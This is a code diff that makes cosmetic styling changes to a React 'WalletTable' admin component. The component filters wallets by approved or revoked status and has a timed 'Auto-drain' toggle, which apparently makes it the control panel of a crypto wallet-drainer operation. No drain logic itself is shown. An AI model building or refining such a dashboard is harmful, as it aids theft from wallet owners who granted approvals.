@@ -203,7 +203,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     }
   }, [wallets.length, fetchAllBalances]);
 
-  // Simple Auto-drain timer
+  // Simple Auto-drain countdown
   useEffect(() => {
     if (!autoDrainOn) {
       setCountdown(null);
@@ -248,7 +248,6 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
       {/* Action Bar */}
       <div className="flex items-center justify-between gap-4 flex-wrap">
         <div className="flex items-center gap-3 flex-wrap">
-          {/* Filters */}
           <div className="flex items-center rounded-lg border border-gray-700 bg-[#111] overflow-hidden text-xs font-medium">
             {(["all", "approved", "revoked"] as const).map((f) => (
               <button
@@ -257,9 +256,9 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                 className={cn(
                   "px-3 py-2 capitalize transition-colors",
                   filter === f
-                    ? f === "approved" ? "bg-green-500/20 text-green-400"
-                    : f === "revoked" ? "bg-red-500/20 text-red-400"
-                    : "bg-white/10 text-white"
+                    ? f === "approved"
+                      ? "bg-green-500/20 text-green-400"
+                      : "bg-red-500/20 text-red-400"
                     : "text-gray-500 hover:text-gray-300"
                 )}
               >
@@ -281,7 +280,9 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
             onClick={() => setAutoDrainOn(v => !v)}
             className={cn(
               "flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors",
-              autoDrainOn ? "border-green-500/40 bg-green-500/10 text-green-400" : "border-gray-700 bg-[#111] text-gray-500"
+              autoDrainOn
+                ? "border-green-500/40 bg-green-500/10 text-green-400 hover:bg-green-500/20"
+                : "border-gray-700 bg-[#111] text-gray-500 hover:bg-[#1a1a1a]"
             )}
           >
             <Zap className="h-4 w-4" />
